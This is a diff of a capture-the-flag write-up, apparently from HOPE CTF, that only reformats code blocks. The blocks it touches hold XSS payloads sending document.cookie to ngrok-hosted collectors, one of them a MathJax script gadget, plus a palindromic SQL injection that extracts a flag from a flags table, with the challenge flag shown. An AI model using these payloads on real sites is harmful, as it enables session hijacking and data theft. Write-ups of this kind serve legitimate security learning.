@@ -37,7 +37,9 @@ the important part of this challenge is :
 
 My solution : 
 
-```<img src=x onerror=javascript:document.location='http://37b0-41-225-85-6.ngrok.io/ok.php?c='+document.cookie;```
+```html
+<img src=x onerror=javascript:document.location='http://37b0-41-225-85-6.ngrok.io/ok.php?c='+document.cookie;
+```
 
 with ok.php :
 ```php
@@ -78,9 +80,13 @@ payload : ```%'||(SELECT flag FROM flags)||'%');---;)'%'||)sgalf MORF galf TCELE
 
 the final query looks like this 
 
-```insert into pending (user, sentence) values ('1234', '%'||(SELECT flag FROM flags)||'%');---;)'%'||)sgalf MORF galf TCELES(||'%');```
+```sql
+insert into pending (user, sentence) values ('1234', '%'||(SELECT flag FROM flags)||'%');---;)'%'||)sgalf MORF galf TCELES(||'%');
+```
 
-```flag : hope{ecid_gnivlovni_semordnilap_fo_kniht_ton_dluoc}```
+```
+flag : hope{ecid_gnivlovni_semordnilap_fo_kniht_ton_dluoc}
+```
 
 ------------------------------------------------------------------------------------------------------------------------------------
 
@@ -90,7 +96,9 @@ Abusing MathJax renderer for an xss by supplying the source to the mathjax file
 
 payload :
 
-```<script src="https://mk.mc.ax/MathJax/MathJax.js">document.location='http://02f6-41-225-148-43.ngrok.io/ok.php?c='+document.cookie;</script>```
+```javascript
+<script src="https://mk.mc.ax/MathJax/MathJax.js">document.location='http://02f6-41-225-148-43.ngrok.io/ok.php?c='+document.cookie;</script>
+```
 
 
 with ok.php :
